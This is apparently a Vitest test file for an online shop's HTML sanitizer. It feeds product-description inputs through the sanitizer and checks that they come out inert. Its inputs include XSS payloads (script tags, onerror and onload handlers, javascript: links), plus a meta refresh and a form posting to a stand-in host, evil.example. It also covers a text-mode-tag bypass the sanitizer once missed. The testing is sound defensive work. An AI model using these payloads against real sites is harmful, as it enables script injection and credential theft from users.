import { describe, expect, it } from 'vitest';
import { sanitizeHtml } from '../../worker/lib/sanitize';

/**
 * The sanitizer is the boundary between "staff may write rich text" and
 * "staff may write markup". Every case here is one somebody could type into
 * a product description, so every case here has to come out inert.
 */

describe('what a description may keep', () => {
  it('keeps the formatting the shop actually uses', async () => {
    const out = await sanitizeHtml('<p>A <strong>relaxed</strong> shirt, <em>cut long</em>.</p><ul><li>Linen</li></ul>');
    expect(out).toBe('<p>A <strong>relaxed</strong> shirt, <em>cut long</em>.</p><ul><li>Linen</li></ul>');
  });

  it('keeps a link, and sends it out safely', async () => {
    const out = await sanitizeHtml('<a href="https://example.com" onclick="steal()">size guide</a>');
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('rel="noopener noreferrer nofollow"');
    expect(out).not.toContain('onclick');
  });

  it('drops a javascript: link but keeps the words', async () => {
    const out = await sanitizeHtml('<a href="javascript:alert(1)">tap</a>');
    expect(out).not.toContain('javascript:');
    expect(out).toContain('tap');
  });
});

describe('what a description may not keep', () => {
  it('drops scripts, styles, frames and forms with everything in them', async () => {
    for (const bad of [
      '<script>alert(1)</script>',
      '<style>body{display:none}</style>',
      '<iframe src="/admin"></iframe>',
      '<form action="https://evil.example"><input name="p"></form>',
      '<svg onload=alert(1)></svg>',
      '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    ]) {
      expect(await sanitizeHtml(bad)).toBe('');
    }
  });

  it('strips event handlers from tags it keeps', async () => {
    const out = await sanitizeHtml('<p onmouseover="steal()">hello</p>');
    expect(out).toBe('<p>hello</p>');
  });
});

/**
 * The bypass this file was written for. Each of these tags flips the HTML
 * parser into a text mode, so its contents used to be handed back as raw
 * markup once the wrapper was stripped — a redirect, a stylesheet or a form
 * on the shop's own domain, written by anyone who could edit a product.
 */
describe('markup smuggled through a text-mode tag', () => {
  const wrappers = ['title', 'xmp', 'noembed', 'noframes', 'listing'];
  const payloads = [
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<script>alert(1)</script>',
    '<style>*{background:red}</style>',
    '<img src=x onerror=alert(1)>',
    '<iframe src="/admin"></iframe>',
    '<a href="javascript:alert(1)">x</a>',
  ];

  for (const tag of wrappers) {
    for (const payload of payloads) {
      it(`<${tag}> cannot carry ${payload.slice(0, 28)}…`, async () => {
        const out = await sanitizeHtml(`<${tag}>${payload}</${tag}>`);
        expect(out).not.toContain('<meta');
        expect(out).not.toContain('<script');
        expect(out).not.toContain('<style');
        expect(out).not.toContain('<iframe');
        expect(out).not.toContain('onerror');
        expect(out).not.toContain('javascript:');
      });
    }
  }

  it('<plaintext> cannot carry markup either', async () => {
    const out = await sanitizeHtml('<plaintext><form action="https://evil.example"><input name=p></form>');
    expect(out).not.toContain('<form');
    expect(out).not.toContain('<input');
  });

  it('leaves the honest text around it alone', async () => {
    const out = await sanitizeHtml('<p>ok</p><title><script>alert(1)</script></title><p>still ok</p>');
    expect(out).toContain('<p>ok</p>');
    expect(out).toContain('<p>still ok</p>');
    expect(out).not.toContain('<script');
  });
});
